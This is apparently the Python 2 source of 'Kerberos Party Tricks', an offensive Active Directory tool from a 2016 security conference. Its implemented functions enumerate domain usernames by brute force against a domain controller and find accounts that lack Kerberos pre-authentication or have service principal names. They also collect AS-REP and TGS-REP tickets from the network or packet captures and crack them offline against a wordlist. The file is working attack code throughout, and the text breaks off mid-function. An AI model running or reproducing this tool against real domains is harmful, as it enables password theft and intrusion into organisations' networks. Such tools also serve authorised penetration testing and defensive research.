#!/usr/bin/python

# Author
# ------
# Geoffrey Janjua
# Contact : geoffrey.janjua at exumbraops dot com
#
# Thank you to:
# Tim Medin (Counter Hack)
# Sean Metcalf (AD Security)
# Sylvian Monne (BiDOrD)
# Benjamin Delpy (gentilkiwi)
# Alberto Solino (core security)

# 27 May 2016
# Kerberos Party Tricks (mad beta edition)
# LayerOne 2016 
# 
# Current tricks = +, Not implemented yet = -
#  No auth req'd
#  + Bruteforce usernames by name
#  - Bruteforce usernames by SID
#  + Bruteforce and get AS-REPs for "No Pre-Authentication Required" accounts
#  Auth req'd
#  + Scan for Service Accounts via SPN
#  + Scan for "No Pre-Authentication Required" accounts
#  - Dump Domain users
#  - Dump hashes from Domain Controller via replication i.e. DCSync (Domain Admin account required)
#  Recover KRB auth from PCAP
#  + TGS-REP
#  + AS-REP
#  Crack KRB tickets offline
#  + TGS-REP
#  + AS-REP
#  Other
#  - Modify KRB tickets to impersonate users

import string, logging, struct, sys, os, binascii, cmd, ldap # run 'pip install python-ldap' or apt-get install python-ldap to install ldap module.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from random import getrandbits
from time import time, localtime, strftime
from pyasn1.codec.ber import encoder, decoder

from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5, decrypt
from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
    AD_WIN2K_PAC
from kek.pac import build_pac, pretty_print_pac
from kek.util import epoch2gt, gt2epoch

def export_tickets():
    return True

def mod_krb():
    return True

def show(arg):
# make header, standardize layout
    print "\nRecovered Kerberos Tickets"
    print "--------------------------"
    for idx, accts in enumerate(krbTricks.loot):
        if 'krbas' in accts:
            gotrep = 'AS-REP'
        elif 'krbtgs' in accts:
            gotrep = 'TGS-REP'
        else:
            gotrep = 'No Ticket'
        #print "[%d]\t%s\t%s@%s\t%s" % (idx, gotasrep, accts['user_name'], accts['domain'], accts['password'])
        sys.stdout.write("  [%d]" % idx)
        for k,v in accts.items():
            if k != 'krbas' and k != 'krbtgs':
                p = '{0: <15}'.format(v)
                sys.stdout.write("\t%s" % p)
                #sys.stdout.write(p)
        sys.stdout.write(" %s\n" % gotrep)

def brute_sid():
    return True

def brute_user():
    return True

def brute_no_pre_auth():
    return True

def scan_ldap_no_pre_auth(dc, bindusername, binddomain, bindpass):
# todo fix filter, currently static 
    binddn = bindusername+'@'+binddomain
    basedn = "cn=users"
    for d in binddomain.split('.'):
        basedn += ", dc="+d

    try:
        # Try and make a synchronous bind
        conn = ldap.open(dc)
        conn.simple_bind_s(binddn,bindpass)

        # Search information
        scope = ldap.SCOPE_SUBTREE

        filter = "(userAccountControl=4260352)"
        #attributes = ['sAMAccountName','memberOf' ]
        attributes = ['*' ]

        # Search! 
        result = conn.search_s( basedn, scope, filter, attributes )
        for r in result:
            print r[1]['sAMAccountName'][0]
            #print r[1]
            if 'primaryGroupID' in r[1]:
                print '  primaryGroupID = '+r[1]['primaryGroupID'][0] 
            if 'distinguishedName' in r[1]:
                print '  distinguishedName = '+r[1]['distinguishedName'][0] 
            if 'objectSid' in r[1]:
                objSid = r[1]['objectSid'][0]
                SRL = str(int(binascii.b2a_hex(objSid[0]), 16))
                SA = str(int(binascii.b2a_hex(objSid[1]), 16))
                IAV = str(int(binascii.b2a_hex(objSid[2:8]), 16))
                RIDa = str(int(binascii.b2a_hex(objSid[8:12][::-1]), 16))
                RIDb = str(int(binascii.b2a_hex(objSid[12:16][::-1]), 16))
                RIDc = str(int(binascii.b2a_hex(objSid[16:20][::-1]), 16))
                RIDd = str(int(binascii.b2a_hex(objSid[20:24][::-1]), 16))
                RIDe = str(int(binascii.b2a_hex(objSid[24:28][::-1]), 16))
                sid = 'S-'+SRL+'-'+IAV+'-'+RIDa+'-'+RIDb+'-'+RIDc+'-'+RIDd+'-'+RIDe
                print '  Sid = '+sid
                user_sid = sid
            else:
                user_sid = 'S-1-5-21-3623811015-3361044348-30300820-1013'
            if 'badPwdCount' in r[1]:
                print '  badPwdCount = '+r[1]['badPwdCount'][0] 
            if 'givenName' in r[1]:
                print '  givenName = '+r[1]['givenName'][0] 

            krbTricks.set_arg['pre'] = False
            user_key = (RC4_HMAC, ntlm_hash("\x00").digest())
            try:
                net_get_as_rep(binddomain, r[1]['sAMAccountName'][0], user_sid, user_key, dc)
                rep = decoder.decode(krbTricks.set_arg['net_krbas'].decode('hex'))[0]
                if rep[1] == 11:
                    print "  [+] Got a valid AS-REP for %s... Done!" % r[1]['sAMAccountName'][0]
                    krbTricks.loot.append({'user_name':r[1]['sAMAccountName'][0], 'domain':binddomain, 'target_service':'krbtgt', 'krbas':krbTricks.set_arg['net_krbas']})
                if rep[4] == 25:
                    print "  [-] Invalid AS-REP for %s... " % r[1]['sAMAccountName'][0]
                    print "  [+] Got a valid user name (%s)... Done!" % r[1]['sAMAccountName'][0]
                    krbTricks.loot.append({'user_name':r[1]['sAMAccountName'][0], 'domain':binddomain, 'target_service':'krbtgt' })
                if rep[4] == 18:
                    print "  [-] Invalid AS-REP for %s... " % r[1]['sAMAccountName'][0]
                    print "  [+] %s locked... Done!" % r[1]['sAMAccountName'][0]
                    krbTricks.loot.append({'user_name':r[1]['sAMAccountName'][0], 'domain':binddomain, 'target_service':'krbtgt' })
                if rep[4] == 6:
                    print "  [-] Not a valid user name (%s)... " % r[1]['sAMAccountName'][0]
                    # principal unknown i.e. not a user
                krbTricks.set_arg['padata_type'] = ''

            except:
                print(' can\'t send data to the DC ?\n')
            #    return

        show('users')
    except ldap.LDAPError as e:
        print e

def scan_spn(dc, bindusername, binddomain, bindpass):
    binddn = bindusername+'@'+binddomain
    basedn = "cn=users"
    for d in binddomain.split('.'):
        basedn += ", dc="+d

    try:
        # Try and make a synchronous bind
        conn = ldap.open(dc)
        conn.simple_bind_s(binddn,bindpass)

        # Search information
        scope = ldap.SCOPE_SUBTREE

        filter = "(servicePrincipalName=*)"
        attributes = ['sAMAccountName','servicePrincipalName','memberOf' ]

        # Search! 
        result = conn.search_s( basedn, scope, filter, attributes )
        for r in result:
            print r[1]['sAMAccountName'][0]
            if 'memberOf' in r[1]:
                print '\t'+r[1]['memberOf'][0]
            print '\t'+str(r[1]['servicePrincipalName'])
    except ldap.LDAPError as e:
        print e

#objSid = result[0][1]['objectSid'][0]

def dump_domain_users():
    return True

def dump_domain_hashes():
    return True

def pcap_get_as_rep(packets):
    MESSAGETYPEOFFSETUDP = 17
    MESSAGETYPEOFFSETTCP = 21
    DEBUG = True

    AS_REP = chr(11)
    kploads = []
    i = 1
    unfinished = {}
    user_name = 'FIXME'
    user_realm = 'FIXME'
    target_service = 'FIXME'
    target_realm = 'FIXME'
    for p in packets:
        # UDP
        if p.haslayer(UDP) and p.sport == 88 and p[UDP].load[MESSAGETYPEOFFSETUDP] == AS_REP:
            size = struct.unpack(">I", p[UDP].load[:4])[0]
            rep = decoder.decode(p[UDP].load[4:size+4])[0]
            if rep[1] == 11 or rep[4] == 25 or rep[4] == 18:
                user_name = rep[4][1][0]
                user_realm = rep[5][1]
                target_service = rep[5][2][1][0]
                target_realm =rep[5][2][1][1] 
            if next((item for item in krbTricks.loot if item["user_name"] == user_name), None):
                pass
            else:
                krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbas':binascii.b2a_hex(p[UDP].load)})

        #TCP
        elif p.haslayer(TCP) and p.sport == 88 and p[TCP].flags & 23== 16: #ACK Only, ignore push (8), urg (32), and ECE (64+128)
            # assumes that each TCP packet contains the full payload
            if len(p[TCP].load) > MESSAGETYPEOFFSETTCP and p[TCP].load[MESSAGETYPEOFFSETTCP] == AS_REP:
                # found start of new AS-REP
                size = struct.unpack(">I", p[TCP].load[:4])[0]
                if size + 4 == len(p[TCP].load):
                    rep = decoder.decode(p[TCP].load[4:size+4])[0]
                    user_name = rep[3][1][0]
                    user_realm = rep[2]
                    target_service = rep[4][2][1][0]
                    target_realm = rep[4][2][1][1]
                    if next((item for item in krbTricks.loot if item["user_name"] == user_name), None):
                        pass
                    else:
                        krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbas':binascii.b2a_hex(p[TCP].load[4:size+4])})
                else:
                    #print 'ERROR: Size is incorrect: %i vs %i' % (size, len(p[TCP].load))
                    unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (p[TCP].load[4:size+4], size)
            elif unfinished.has_key((p[IP].src, p[IP].dst, p[TCP].dport)):
                ticketdata, size = unfinished.pop((p[IP].src, p[IP].dst, p[TCP].dport))
                ticketdata += p[TCP].load
                if len(ticketdata) == size:
                    rep = decoder.decode(p[TCP].load[4:size+4])[0]
                    user_name = rep[3][1][0]
                    user_realm = rep[2]
                    target_service = rep[4][2][1][0]
                    target_realm = rep[4][2][1][1]
                    if next((item for item in krbTricks.loot if item["user_name"] == user_name), None):
                        pass
                    else:
                        krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbas':binascii.b2a_hex(p[TCP].load[4:size+4])})
                elif len(ticketdata) < size:
                    unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (ticketdata, size)
                else:
                    # OH NO! Oversized!
                    print 'Too much data received! Source: %s Dest: %s DPort %i' % (p[IP].src, p[IP].dst, p[TCP].dport)

def pcap_get_tgs_rep(packets):
    MESSAGETYPEOFFSETUDP = 17
    MESSAGETYPEOFFSETTCP = 21
    DEBUG = True

    TGS_REP = chr(13)
    kploads = []
    i = 1
    unfinished = {}
    user_name = 'FIXME'
    user_realm = 'FIXME'
    target_service = 'FIXME'
    target_realm = 'FIXME'
    for p in packets:
        # UDP
        if p.haslayer(UDP) and p.sport == 88 and p[UDP].load[MESSAGETYPEOFFSETUDP] == TGS_REP:
            rep = decoder.decode(p[UDP].load[4:size+4])[0]
            user_name = rep[3][1][0]
            user_realm = rep[2]
            target_service = rep[4][2][1][0] 
            target_realm = rep[4][2][1][1]
            if next((item for item in krbTricks.loot if item["target_service"] == target_service), None):
                pass
            else:
                krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbtgs':binascii.b2a_hex(p[UDP].load)})

        #TCP
        elif p.haslayer(TCP) and p.sport == 88 and p[TCP].flags & 23== 16: #ACK Only, ignore push (8), urg (32), and ECE (64+128)
            # assumes that each TCP packet contains the full payload

            if len(p[TCP].load) > MESSAGETYPEOFFSETTCP and p[TCP].load[MESSAGETYPEOFFSETTCP] == TGS_REP:
                # found start of new TGS-REP
                size = struct.unpack(">I", p[TCP].load[:4])[0]
                if size + 4 == len(p[TCP].load):
                    rep = decoder.decode(p[TCP].load[4:size+4])[0]
                    user_name = rep[3][1][0]
                    user_realm = rep[2]
                    target_service = rep[4][2][1][0] 
                    target_realm = rep[4][2][1][1]
                    if next((item for item in krbTricks.loot if item["target_service"] == target_service), None):
                        pass
                    else:
                        krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbtgs':binascii.b2a_hex(p[TCP].load[4:size+4])})
                else:
                    unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (p[TCP].load[4:size+4], size)
            elif unfinished.has_key((p[IP].src, p[IP].dst, p[TCP].dport)):
                ticketdata, size = unfinished.pop((p[IP].src, p[IP].dst, p[TCP].dport))
                ticketdata += p[TCP].load
                if len(ticketdata) == size:
                    rep = decoder.decode(p[TCP].load[4:size+4])[0]
                    user_name = rep[3][1][0]
                    user_realm = rep[2]
                    target_service = rep[4][2][1][0] 
                    target_realm = rep[4][2][1][1]
                    if next((item for item in krbTricks.loot if item["target_service"] == target_service), None):
                        pass
                    else:
                        krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbtgs':binascii.b2a_hex(p[TCP].load[4:size+4])})
                elif len(ticketdata) < size:
                    unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (ticketdata, size)
                else:
                    # OH NO! Oversized!
                    print 'Too much data received! Source: %s Dest: %s DPort %i' % (p[IP].src, p[IP].dst, p[TCP].dport)

def net_get_user_sid(dc, bindusername, binddomain, bindpass, acct):
    binddn = bindusername+'@'+binddomain
    #basedn = "cn=users"
    basedn = binddomain
    basedn = "dc="+basedn.replace('.', ",dc=");
    #print "DC="+dc+" bindusername="+bindusername+" binddomain="+binddomain+" bindpass="+bindpass+" acct="+acct
    #print "binddn="+binddn+" basedn="+basedn 
    ldap.set_option(ldap.OPT_REFERRALS, ldap.OPT_OFF)

    try:
        # Try and make a synchronous bind
        conn = ldap.open(dc)
        conn.simple_bind_s(binddn,bindpass)
        #print "connected"

        # Search information
        scope = ldap.SCOPE_SUBTREE

        #ldapfilter = "(&(objectClass=User)(sAMAccountName="+acct+"))"
        #attributes = ['cn','dn', 'objectSID']
        ldapfilter = "(sAMAccountName="+acct+")"
        attributes = ['cn','dn', 'objectSID']

        # Search! 
        result = conn.search_s( basedn, scope, ldapfilter, attributes )
        objSid = result[0][1]['objectSid'][0]
        #print binascii.b2a_hex(objSid)
        SRL = str(int(binascii.b2a_hex(objSid[0]), 16))
        SA = str(int(binascii.b2a_hex(objSid[1]), 16))
        IAV = str(int(binascii.b2a_hex(objSid[2:8]), 16))
        RIDa = str(int(binascii.b2a_hex(objSid[8:12][::-1]), 16))
        RIDb = str(int(binascii.b2a_hex(objSid[12:16][::-1]), 16))
        RIDc = str(int(binascii.b2a_hex(objSid[16:20][::-1]), 16))
        RIDd = str(int(binascii.b2a_hex(objSid[20:24][::-1]), 16))
        RIDe = str(int(binascii.b2a_hex(objSid[24:28][::-1]), 16))
        #sid = binascii.b2a_hex(result[2][1]['objectSid'][0])
        sid = 'S-'+SRL+'-'+IAV+'-'+RIDa+'-'+RIDb+'-'+RIDc+'-'+RIDd+'-'+RIDe
        krbTricks.set_arg['user_sid'] = sid
    except ldap.LDAPError as e:
        print e

def crack_as_rep(user_key, pkt, plaintext_password):
    data = binascii.a2b_hex(pkt) 
    #sys.stderr.write('  [+] Parsing AS-REP')
    sys.stderr.flush()
    try:
        as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
        session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
        logon_time = gt2epoch(str(as_rep_enc['authtime']))
        tgt_a = as_rep['ticket']
        sys.stderr.write('  Done!\n')
        sys.stderr.write('  [+] Cracked with password (RC4) %s (%s)\n' % (plaintext_password,binascii.b2a_hex(user_key[1])))
        return True
    except Exception as e:
        #print ' ERROR:', e
        pass

def crack_tgs_rep(user_key, pkt, plaintext_password):
    #datab = binascii.a2b_hex(pkt)
    data = str(decoder.decode(pkt.decode('hex'))[0][4][3][2])
    #sys.stderr.write(binascii.b2a_hex(str(decoder.decode(pkt.decode('hex'))[0][4][3][2])))
    #sys.stderr.write('  [+] Parsing TGS-REP')
    sys.stderr.flush()
    try:
        decrypt(23, str(user_key[1]), 2, data)
        #tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
        #session_key2 = (int(tgs_rep_enc['key']['keytype']), str(tgs_rep_enc['key']['keyvalue']))
        #tgt_b = tgs_rep['ticket']
        sys.stderr.write('  Done!\n')
        sys.stderr.write('  [+] Cracked with password (RC4) %s (%s)\n' % (plaintext_password,binascii.b2a_hex(user_key[1])))
        return True
    except Exception as e:
        #print ' ERROR:', e
        pass

def net_get_as_rep(user_realm, user_name, user_sid, user_key, kdc_a):
    if 'pre' in krbTricks.set_arg:
        if krbTricks.set_arg['pre'] == True:
            krbTricks.set_arg['padata_type'] = 2
        else:
            krbTricks.set_arg['padata_type'] = 149
  
    sys.stderr.write('  [+] Building AS-REQ for %s@%s...' % (user_name,user_realm))
    sys.stderr.flush()
    nonce = getrandbits(31)
    current_time = time()
    pac_request=False
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request, krbTricks.set_arg['padata_type'])
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Sending AS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(as_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving AS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')
    hdata = binascii.b2a_hex(data)
    #krbTricks.set_arg['pre'] = False
    if 'pre' in krbTricks.set_arg:
        if krbTricks.set_arg['pre'] == True:
            krbTricks.set_arg['net_krbas_tgs'] = hdata
        else:
            krbTricks.set_arg['net_krbas'] = hdata
    else:
        krbTricks.set_arg['net_krbas'] = hdata
  

def net_get_tgs_rep(user_realm, user_name, user_sid, user_key, kdc_a, target_realm, target_service, target_host, krbtgt_a_key=None, trust_ab_key=None, target_key=None):

#   net_get_tgs_rep(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_service, target_host)
    if 'net_krbas_tgs' not in krbTricks.set_arg:
        net_get_as_rep(user_realm, user_name, user_sid, user_key, kdc_a)

    sys.stderr.write('  [+] Parsing AS-REP from %s@%s...' % (user_name,user_realm))
    sys.stderr.flush()
    as_rep, as_rep_enc = decrypt_as_rep(binascii.a2b_hex(krbTricks.set_arg['net_krbas_tgs']), user_key)
    session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
    logon_time = gt2epoch(str(as_rep_enc['authtime']))
    tgt_a = as_rep['ticket']
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_a)
    sys.stderr.flush()
    subkey = generate_subkey()
    nonce = getrandbits(31)
    current_time = time()
    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
    tgs_req = build_tgs_req(user_realm, target_service, target_realm, user_realm, user_name, tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(tgs_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')
    hdata = binascii.b2a_hex(data)
    if target_service == 'krbtgt':
        krbTricks.set_arg['net_krbtgs'] = hdata
    else:
        user_name = 'FIXME'
        #user_name = target_service+'/'+target_realm
        krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':target_service,'target_realm':target_realm, 'krbtgs':hdata})

class krbTricks(cmd.Cmd):
    prompt = 'Party time! > '
    intro = '                 ,,,,,\nKerberos        _|||||_\n   Party       {~*~*~*~}\n  Tricks       {*~*~*~*}  \n\n'
    undoc_header = 'Attack Modules'
    doc_header = 'Attack Commands'
    set_arg = {}
    #loot = {'krbtkt':'', 'username':'', 'sid':'', 'preauth':'', 'spn':'', 'host':'', 'port':'', 'password':'', 'entry_type':'', 'from_cmd':''}
    loot = []
    #COMMANDS = ['mod_krb', 'brute_sid', 'brute_user', 'scan_ldap_no_pre_auth', 'scan_spn', 'dump_domain_users', 'dump_domain_hashes', 'pcap_get_tickets', 'crack_as_rep', 'crack_tgs_rep', 'net_get_as_rep', 'net_get_tgs_rep', 'crack_as_rep_manual', 'crack_tgs_rep_manual']
    COMMANDS = ['brute_no_pre_auth', 'net_get_as_rep', 'pcap_get_tickets', 'crack_as_rep_manual', 'crack_tgs_rep_manual', 'crack_as_rep', 'crack_tgs_rep', 'crack_tickets', 'scan_spn']

    def complete_use(self, text, line, begidx, endidx):
        if not text:
            completions = self.COMMANDS[:]
        else:
            completions = [ f 
                            for f in self.COMMANDS
                            if f.startswith(text)
                          ]
        return completions

    def do_use(self, line):
        if line == "brute_no_pre_auth":
            krbTricks.bad_cmd(self, "brute_no_pre_auth")
            self.prompt = "brute_no_pre_auth > "
        elif line == "net_get_as_rep":
            krbTricks.bad_cmd(self, "net_get_as_rep")
            self.prompt = "net_get_as_rep > "
        elif line == "pcap_get_tickets":
            krbTricks.bad_cmd(self, "pcap_get_tickets")
            self.prompt = "pcap_get_tickets > "
        elif line == "crack_as_rep_manual":
            krbTricks.bad_cmd(self, "crack_as_rep_manual")
            self.prompt = "crack_as_rep_manual > "
        elif line == "crack_tgs_rep_manual":
            krbTricks.bad_cmd(self, "crack_tgs_rep_manual")
            self.prompt = "crack_tgs_rep_manual > "
        elif line == "crack_as_rep":
            krbTricks.bad_cmd(self, "crack_as_rep")
            self.prompt = "crack_as_rep > "
        elif line == "crack_tgs_rep":
            krbTricks.bad_cmd(self, "crack_tgs_rep")
            self.prompt = "crack_tgs_rep > "
        elif line == "crack_tickets":
            krbTricks.bad_cmd(self, "crack_tickets")
            self.prompt = "crack_tickets > "
        elif line == "scan_spn":
            krbTricks.bad_cmd(self, "scan_spn")
            self.prompt = "scan_spn > "
        else:
            print "whut"

    def do_set(self, line):
        " Sets a value\n set KRB [value]\n\n"
	a,v = line.split(' ', 1)
        krbTricks.set_arg[a] = v
        print " "+a+" = "+v+"\n"

    def do_show(self,line):
        show(line)

    def do_mod_krb(self, line):
        krbTricks.bad_cmd(self, 'mod_krb')
        return 

    def do_brute_sid(self, line):
        krbTricks.bad_cmd(self, 'brute_sid')
        return 

    def do_brute_user(self, line):
        krbTricks.bad_cmd(self, 'brute_user')
        return 

    def do_brute_no_pre_auth(self, line):
        krbTricks.set_arg['pre'] = False
	try:
            words = [f.rstrip('\n') for f in open(krbTricks.set_arg['userlist'])]
        except:
            krbTricks.bad_cmd(self, 'brute_no_pre_auth')
            return

        for user_name in words:
            if 'domain' in krbTricks.set_arg and 'dc' in krbTricks.set_arg:
                if next((item for item in krbTricks.loot if item["user_name"] == user_name), None):
                    print ""
                else:
                    krbTricks.set_arg['padata_type'] = 149
                    user_key = (RC4_HMAC, ntlm_hash("\x00").digest())
                    user_sid = 'S-1-5-21-3623811015-3361044348-30300820-1013'
                    user_realm = krbTricks.set_arg['domain']
                    kdc_a = krbTricks.set_arg['dc']
                    padata_type = krbTricks.set_arg['padata_type']
                    try:
                        net_get_as_rep(user_realm, user_name, user_sid, user_key, kdc_a)
                        
                    except:
			print(' can\'t send data to the DC ?\n')
                        return
                    try:
                        krbTricks.set_arg['padata_type'] = ''
                        rep = decoder.decode(krbTricks.set_arg['net_krbas'].decode('hex'))[0]
                        #if user_name not in enuberate(krbTricks.loot):
                        if rep[1] == 11:
                            krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt', 'krbas':krbTricks.set_arg['net_krbas']})
                        if rep[4] == 25:
                            krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt'})
                        if rep[4] == 18:
                            krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt'})
                        #if rep[4] == 6:
                            # principal unknown i.e. not a user
                            #krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'krbas':krbTricks.set_arg['net_krbas']})
                    except:
                        print('  [+] Decoding AS-REP from dc.onlyfor.hax... No Ticket\n')

            else:
                krbTricks.bad_cmd(self, 'brute_no_pre_auth')
                return

        show('users')

    def do_scan_ldap_no_pre_auth(self, line):
        if 'domain' in krbTricks.set_arg and 'username' in krbTricks.set_arg and 'dc' in krbTricks.set_arg:
            try:
                scan_ldap_no_pre_auth(krbTricks.set_arg['dc'], krbTricks.set_arg['username'], krbTricks.set_arg['domain'] , krbTricks.set_arg['password'])
            except:
                print(' Uh-oh, something went wrong :(')
                return
        else:
            krbTricks.bad_cmd(self, 'scan_ldap_no_pre_auth')

    def do_scan_spn(self, line):
        if 'domain' in krbTricks.set_arg and 'username' in krbTricks.set_arg and 'dc' in krbTricks.set_arg:
            try:
                scan_spn(krbTricks.set_arg['dc'], krbTricks.set_arg['username'], krbTricks.set_arg['domain'] , krbTricks.set_arg['password'])
            except:
                print(' Uh-oh, something went wrong :(')
                return
        else:
            krbTricks.bad_cmd(self, 'scan_spn')

    def do_dump_domain_users(self, line):
        krbTricks.bad_cmd(self, 'dump_domain_users')
        return 

    def do_dump_domain_hashes(self, line):
        krbTricks.bad_cmd(self, 'dump_domain_hashes')
        return 

    def do_pcap_get_tickets(self, line):
        packets = rdpcap(krbTricks.set_arg['pcap'])
        pcap_get_as_rep(packets)
        pcap_get_tgs_rep(packets)
        show('users')

    def do_crack_tickets(self, line):
        for idx, accts in enumerate(krbTricks.loot):
            if 'krbas' in accts or 'krbtgs' in accts: 
               if "wordlist" in krbTricks.set_arg and 'password' not in krbTricks.loot[idx]:
                   print " Trying to crack %s" % accts['user_name']
                   words = [f.rstrip('\n') for f in open(krbTricks.set_arg['wordlist'])]
                   for word in words:
                       user_key = (RC4_HMAC, ntlm_hash(word).digest())
                       if 'krbtgs' in accts:
                           if crack_tgs_rep(user_key, accts['krbtgs'], word):
                               krbTricks.loot[idx]['password'] = word
                               break
                       if 'krbas' in accts:
                           if crack_as_rep(user_key, accts['krbas'], word):
                               krbTricks.loot[idx]['password'] = word
                               break
        show('users')


    def do_crack_as_rep(self, line):
        for idx, accts in enumerate(krbTricks.loot):
            if 'krbas' in accts and "wordlist" in krbTricks.set_arg and 'password' not in krbTricks.loot[idx]:
               print " Trying to crack %s" % accts['user_name']
               words = [f.rstrip('\n') for f in open(krbTricks.set_arg['wordlist'])]
               for word in words:
                   user_key = (RC4_HMAC, ntlm_hash(word).digest())
                   if crack_as_rep(user_key, accts['krbas'], word):
                       krbTricks.loot[idx]['password'] = word
                       break
#            else:
#               krbTricks.bad_cmd(self, 'crack_as_rep')
#               return
        show('users')

    def do_crack_tgs_rep(self, line):
        for idx, accts in enumerate(krbTricks.loot):
            if 'krbtgs' in accts and "wordlist" in krbTricks.set_arg and 'password' not in krbTricks.loot[idx]:
               print " Trying to crack %s" % accts['user_name']
               words = [f.rstrip('\n') for f in open(krbTricks.set_arg['wordlist'])]
               for word in words:
                   user_key = (RC4_HMAC, ntlm_hash(word).digest())
                   if crack_tgs_rep(user_key, accts['krbtgs'], word):
                       krbTricks.loot[idx]['password'] = word
                       break
#            else:
#               krbTricks.bad_cmd(self, 'do_crack_tgs_rep')
#               return
        show('users')

    def do_crack_as_rep_manual(self, line):
        if 'krbas' in krbTricks.loot[int(line)] and "wordlist" in krbTricks.set_arg:
            words = [f.rstrip('\n') for f in open(krbTricks.set_arg['wordlist'])]
            for word in words:
                user_key = (RC4_HMAC, ntlm_hash(word).digest())
                if crack_as_rep(user_key, krbTricks.loot[int(line)]['krbas'], word):
                    krbTricks.loot[int(line)]['password'] = word
                    break
#        else:
#            krbTricks.bad_cmd(self, 'crack_as_rep_manual')
#            return
        show('users')

    def do_crack_tgs_rep_manual(self, line):
        #if len(line) > 0 and "wordlist" in krbTricks.set_arg:
        if 'krbtgs' in krbTricks.loot[int(line)] and "wordlist" in krbTricks.set_arg:
            words = [f.rstrip('\n') for f in open(krbTricks.set_arg['wordlist'])]
            for word in words:
                user_key = (RC4_HMAC, ntlm_hash(word).digest())
                if crack_tgs_rep(user_key, krbTricks.loot[int(line)]['krbtgs'], word):
                    krbTricks.loot[int(line)]['password'] = word
                    break
        else:
            krbTricks.bad_cmd(self, 'crack_tgs_rep_manual')
            return
        show('users')

    def do_net_get_as_rep(self, line):
        # todo dont apend if user exists
        krbTricks.set_arg['pre'] = False
        if 'domain' in krbTricks.set_arg and 'username' in krbTricks.set_arg and 'dc' in krbTricks.set_arg:
            if 'pre' in krbTricks.set_arg and 'password' in krbTricks.set_arg and 'user_sid' in krbTricks.set_arg:
                if krbTricks.set_arg['pre'] == True:
                    krbTricks.set_arg['padata_type'] = 2
                    user_key = (RC4_HMAC, ntlm_hash(krbTricks.set_arg['password']).digest())
                    user_sid = krbTricks.set_arg['user_sid']
                else:
                    krbTricks.set_arg['padata_type'] = 149
                    user_key = (RC4_HMAC, ntlm_hash("\x00").digest())
                    user_sid = 'S-1-5-21-3623811015-3361044348-30300820-1013'
            else:
                krbTricks.set_arg['padata_type'] = 149
                user_key = (RC4_HMAC, ntlm_hash("\x00").digest())
                user_sid = 'S-1-5-21-3623811015-3361044348-30300820-1013'
            user_realm = krbTricks.set_arg['domain']
            user_name = krbTricks.set_arg['username']
            kdc_a = krbTricks.set_arg['dc']
            try:
                padata_type = krbTricks.set_arg['padata_type']
                net_get_as_rep(user_realm, user_name, user_sid, user_key, kdc_a)
                rep = decoder.decode(krbTricks.set_arg['net_krbas'].decode('hex'))[0]
                #print rep
                if rep[1] == 11:
                    print "  [+] Got a valid AS-REP for %s... Done!" % user_name
                    krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt', 'krbas':krbTricks.set_arg['net_krbas']})
                if rep[4] == 25:
                    print "  [-] Invalid AS-REP for %s... " % user_name
                    print "  [+] Got a valid user name (%s)... Done!" % user_name
                    krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt' })
                if rep[4] == 18:
                    print "  [-] Invalid AS-REP for %s... " % user_name
                    print "  [+] %s locked... Done!" % user_name
                    krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'target_service':'krbtgt' })
                if rep[4] == 6:
                    print "  [-] Not a valid user name (%s)... " % user_name
                    # principal unknown i.e. not a user
                    #krbTricks.loot.append({'user_name':user_name, 'domain':user_realm, 'krbas':krbTricks.set_arg['net_krbas']})
                krbTricks.set_arg['padata_type'] = ''
    #            print "\n #\tAS-REP\tUser"
    #           for idx, accts in enumerate(krbTricks.loot):
    #               if 'krbas' in accts:
    #                   gotasrep = 'Yes'
